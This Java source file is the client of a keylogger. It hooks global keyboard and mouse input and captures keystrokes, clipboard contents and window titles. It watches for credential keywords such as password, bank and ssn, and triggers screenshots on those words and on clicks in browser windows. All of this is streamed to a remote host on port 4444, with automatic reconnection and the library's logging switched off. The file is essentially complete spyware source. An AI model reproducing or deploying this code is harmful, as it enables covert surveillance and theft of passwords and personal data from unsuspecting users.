package client;
import java.awt.Toolkit;
import java.io.BufferedOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Queue;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Pattern;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseListener;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HWND;

public class Main implements NativeKeyListener, NativeMouseListener {
    protected static DataOutputStream dos;
    private static final String[] KEYWORDS = {"password", "admin", "root", "bank", "passwd", "login", "pin", "ssn"};
    private static final Set<String> TARGET_WINDOWS = new HashSet<>();
    protected static final long ALERT_COOLDOWN_MS = 60_000L; // 60 seconds
    protected  static final Map<String, Long> lastAlertTime = new ConcurrentHashMap<>();
    protected  static final Map<String, Pattern> KEYWORD_PATTERNS = new HashMap<>();

    private static final StringBuilder currentTyped = new StringBuilder();

    protected static final String RED = "\u001B[31m";
    protected static final String GREEN = "\u001B[32m";
    protected static final String YELLOW = "\u001B[33m";
    protected static final String RESET = "\u001B[0m";
    protected static final String BOLD = "\033[1m";

    private static boolean ctrlPressed = false;
    private static boolean shiftPressed = false;
    private static boolean altPressed = false;
    
    // Buffering / batching
    public static final Queue<String> logQueue = new ConcurrentLinkedQueue<>();
    protected static final AtomicInteger queueSize = new AtomicInteger(0);
    public  static final int BATCH_SIZE = 20;           // flush when this many entries accumulated
    private static final long FLUSH_INTERVAL_MS = 2000; // periodic flush interval (2 sec)
    public static final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
    private static volatile long lastActivityTime = System.currentTimeMillis();
    protected static final String ip = "Target";        // Victim Ip
    protected static final int port = 4444;
    static {
        TARGET_WINDOWS.add("file explorer".toLowerCase());
        TARGET_WINDOWS.add("chrome".toLowerCase());
        TARGET_WINDOWS.add("firefox".toLowerCase());
        
        for (String k : KEYWORDS) {
        KEYWORD_PATTERNS.put(k, Pattern.compile("\\b" + Pattern.quote(k) + "\\b", Pattern.CASE_INSENSITIVE));
        }

    }


public static void main(String[] args) {
connectToServer();
// Register shutdown hook ONCE
Runtime.getRuntime().addShutdownHook(new Thread(() -> {
    try { BufferHelpers.flushBuffer(); } catch (Throwable ignored) {}
    scheduler.shutdownNow();
    try { GlobalScreen.unregisterNativeHook(); } catch (Exception ignored) {}
    try { if (dos != null) dos.close(); } catch (IOException ignored) {}
    System.out.println("Shutting down.");
}));

    }

    protected static void connectToServer() {
        
    final long INITIAL_BACKOFF_MS = 1_000L;
    final long MAX_BACKOFF_MS = 30_000L;
    long backoff = INITIAL_BACKOFF_MS;

    while (true) {
        Socket socket = null;
        try {
            socket = new Socket();
            socket.connect(new InetSocketAddress(ip, port), 5000);
            socket.setKeepAlive(true);
            socket.setTcpNoDelay(true);

            dos = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
            System.out.println("Connected to server: " + ip + ":" + port);
            backoff = INITIAL_BACKOFF_MS;

            // Disable jnativehook logging
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);
            logger.setUseParentHandlers(false);

            // Register hooks
            GlobalScreen.registerNativeHook();
            Main listener = new Main();
            GlobalScreen.addNativeKeyListener(listener);
            GlobalScreen.addNativeMouseListener(listener);

            // Schedule buffer flush
            scheduler.scheduleAtFixedRate(() -> {
                try { BufferHelpers.flushBuffer(); } catch (Throwable t) { }
            }, FLUSH_INTERVAL_MS, FLUSH_INTERVAL_MS, TimeUnit.MILLISECONDS);

            // Idle detection
            lastActivityTime = System.currentTimeMillis();
            long idleThresholdMs = 30_000;

            Thread idleThread = new Thread(() -> {
                boolean wasIdle = false;
                try {
                    while (!Thread.currentThread().isInterrupted()) {
                        long now = System.currentTimeMillis();
                        boolean isIdle = (now - lastActivityTime > idleThresholdMs);

                        if (isIdle && !wasIdle) {
                            dos.writeUTF("IDLE");
                            dos.flush();
                            wasIdle = true;
                        } else if (!isIdle && wasIdle) {
                            dos.writeUTF("ACTIVE");
                            dos.flush();
                            wasIdle = false;
                        }
                        Thread.sleep(10_000);
                    }
                } catch (IOException | InterruptedException e) {
                    // Connection lost
                }
            });

            idleThread.setDaemon(true);
            idleThread.start();

            // Wait until connection is lost
            synchronized (Main.class) {
                try { Main.class.wait(); } catch (InterruptedException ignored) {}
            }

        } catch (IOException | NativeHookException e) {
            System.err.println("Connection failed/lost: " + e.getMessage());
        } finally {
            try { if (dos != null) dos.close(); } catch (IOException ignored) {}
            try { if (socket != null) socket.close(); } catch (IOException ignored) {}
        }

        // Backoff before retry
        long jitter = java.util.concurrent.ThreadLocalRandom.current().nextLong(0, 500);
        long sleepMs = Math.min(MAX_BACKOFF_MS, backoff) + jitter;
        try { Thread.sleep(sleepMs); }
        catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
        backoff = Math.min(MAX_BACKOFF_MS, backoff * 2);
    }
}

    // Date Time Format
    protected  static String getTimestamp() {
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
        return LocalDateTime.now().format(formatter);
    }



    private static String getActiveWindowTitle() {
        try {
            char[] buffer = new char[1024];
            HWND hwnd = User32.INSTANCE.GetForegroundWindow();
            if (hwnd == null) return "";
            User32.INSTANCE.GetWindowText(hwnd, buffer, 1024);
            return Native.toString(buffer);
        } catch (Throwable t) {
            return "";
        }
    }

    private static boolean containsKeyword(String text) {
        if (text == null) return false;
        String lc = text.toLowerCase();
        for (String k : KEYWORDS) if (lc.contains(k)) return true;
        return false;
    }

    private static String getClipboardText() {
        try {
            return (String) Toolkit.getDefaultToolkit()
                .getSystemClipboard()
                .getData(java.awt.datatransfer.DataFlavor.stringFlavor);
        } catch (Exception ex) {
            return "[clipboard-unavailable]";
        }
    }

    // ---------------- Key events ----------------
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
    lastActivityTime = System.currentTimeMillis();
    String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
    String window = getActiveWindowTitle();
    int code = e.getKeyCode();


    if (code == NativeKeyEvent.VC_CONTROL) ctrlPressed = true;
    if (code == NativeKeyEvent.VC_SHIFT) shiftPressed = true;
    if (code == NativeKeyEvent.VC_ALT) altPressed = true;

    // (Ctrl/Shift/Alt), do nothing further.
    if (code == NativeKeyEvent.VC_CONTROL || code == NativeKeyEvent.VC_SHIFT || code == NativeKeyEvent.VC_ALT) {
        return;
    }

    boolean anyMod = ctrlPressed || shiftPressed || altPressed;
    if (anyMod) {
        StringBuilder combo = new StringBuilder();
        if (ctrlPressed) combo.append("CTRL + ");
        if (shiftPressed) combo.append("SHIFT + ");
        if (altPressed) combo.append("ALT + ");
        combo.append(keyText);

        // handle clipboard shortcuts (send immediately)
        if (ctrlPressed && (code == NativeKeyEvent.VC_V || code == NativeKeyEvent.VC_C)) {
            String clip = getClipboardText();
            String matched = Helpers.getMatchedKeyword(clip);
            if (code == NativeKeyEvent.VC_V) {
                BufferHelpers.sendLogImmediate(YELLOW+getTimestamp() +YELLOW+ " | "+YELLOW+"["+GREEN+"SHORTCUT"+YELLOW+"] "+combo +RED+" | "+GREEN+"Clipboard: " +YELLOW+ clip +RED+ " | "+GREEN+"Window: " +YELLOW+ window);
            } else {
                BufferHelpers.sendLogImmediate(YELLOW+getTimestamp() +RED+ " | "+YELLOW+"["+GREEN+"SHORTCUT"+YELLOW+"] "+combo +RED+ " | "+GREEN+"Copied: " +YELLOW+ clip +RED+ " | "+GREEN+"Window: " +YELLOW+ window);
            }
        } else {
            BufferHelpers.sendLogImmediate(YELLOW+getTimestamp() +RED+ " | "+YELLOW+"["+GREEN+"SHORTCUT"+YELLOW+"] " + combo +RED+" | "+GREEN+"Window: " +YELLOW+ window);
        }

        return;
    }

    if ("Enter".equalsIgnoreCase(keyText)) {
        // flush typed buffer as sentence + trigger screenshot
        if (currentTyped.length() > 0) {
            String sentence = currentTyped.toString().trim();
            BufferHelpers.addToBuffer(YELLOW+getTimestamp() +RED+ " | "+GREEN+"Key Pressed: " +YELLOW+ sentence +RED+ " | "+GREEN+"Window: " +YELLOW+ window);
            if (containsKeyword(sentence)) ScreenShot.triggerScreenshot("keyword_enter:" + sentence, window);
            currentTyped.setLength(0);
        } else {
            BufferHelpers.addToBuffer(YELLOW+getTimestamp() +RED+ " | "+YELLOW+"["+GREEN+"ENTER"+YELLOW+"]"+RED+" | "+GREEN+"Window: " +YELLOW+ window);
        }
        ScreenShot.triggerScreenshot("enter", window);
    } else if ("Space".equalsIgnoreCase(keyText)) {
        if (currentTyped.length() > 0) {
            String word = currentTyped.toString().trim();
            BufferHelpers.addToBuffer(YELLOW+getTimestamp() +RED+ " | "+GREEN+"Key Pressed: " +YELLOW+ word +RED+ " | "+GREEN+"Window: " +YELLOW+ window);
            if (containsKeyword(word)) ScreenShot.triggerScreenshot("keyword:" + word, window);
            currentTyped.setLength(0);
        }
    } else if ("Backspace".equalsIgnoreCase(keyText)) {
        if (currentTyped.length() > 0) currentTyped.deleteCharAt(currentTyped.length() - 1);
    } else {
        if (keyText.length() > 1) {
            BufferHelpers.addToBuffer(YELLOW+"["+GREEN+"+"+YELLOW+"]"+YELLOW+"    "+getTimestamp() +RED+ " | "+GREEN+"Special Key: " +YELLOW+ keyText +RED+ " | "+GREEN+"Window: " +YELLOW+ window);
        }
    }
}

@Override
public void nativeKeyReleased(NativeKeyEvent e) {
    int code = e.getKeyCode();
    if (code == NativeKeyEvent.VC_CONTROL) ctrlPressed = false;
    if (code == NativeKeyEvent.VC_SHIFT) shiftPressed = false;
    if (code == NativeKeyEvent.VC_ALT) altPressed = false;
    lastActivityTime = System.currentTimeMillis();
}

@Override
public void nativeKeyTyped(NativeKeyEvent e) {
    char c = e.getKeyChar();
    if (c == NativeKeyEvent.CHAR_UNDEFINED) return;

    // append printable chars (skip CR/LF — handled in keyPressed)
    if (c != '\r' && c != '\n') {
        currentTyped.append(c);

        // Check the current typed buffer for keywords
        String matched = Helpers.getMatchedKeyword(currentTyped.toString());
        if (matched != null) {
            String window = getActiveWindowTitle();
            Helpers.onKeywordDetected(matched, window, currentTyped.toString());
            
        }
    }
    
    lastActivityTime = System.currentTimeMillis();
}

    // ---------------- Mouse events ----------------
    @Override
    public void nativeMouseClicked(NativeMouseEvent e) {
        // handled on press to avoid focus race; no-op here
    }

    @Override
    public void nativeMousePressed(NativeMouseEvent e) {
        String window = getActiveWindowTitle();
        if (e.getButton() == NativeMouseEvent.BUTTON1) {
            BufferHelpers.addToBuffer(YELLOW+getTimestamp() +RED+ " | "+GREEN+"Mouse"+YELLOW+" Left Click "+RED+"|"+GREEN+" Window: " +YELLOW+ window);
        } else if (e.getButton() == NativeMouseEvent.BUTTON3) {
            BufferHelpers.addToBuffer(YELLOW+getTimestamp() +RED+ " | "+GREEN+"Mouse"+YELLOW+" Right Click "+RED+"|"+GREEN+" Window: " +YELLOW+ window);
        } else {
            BufferHelpers.addToBuffer(YELLOW+getTimestamp() +RED+ " | "+GREEN+"Mouse"+YELLOW+" Button " + e.getButton() +RED+"|"+GREEN+" Window: " +YELLOW+ window);
        }

        String lw = window == null ? "" : window.toLowerCase();
        for (String target : TARGET_WINDOWS) {
            if (lw.contains(target)) {
                ScreenShot.triggerScreenshot("mouse_click_in_target:" + target, window);
                break;
            }
        }
        
        lastActivityTime = System.currentTimeMillis();
    }

    @Override
    public void nativeMouseReleased(NativeMouseEvent e) {}
}
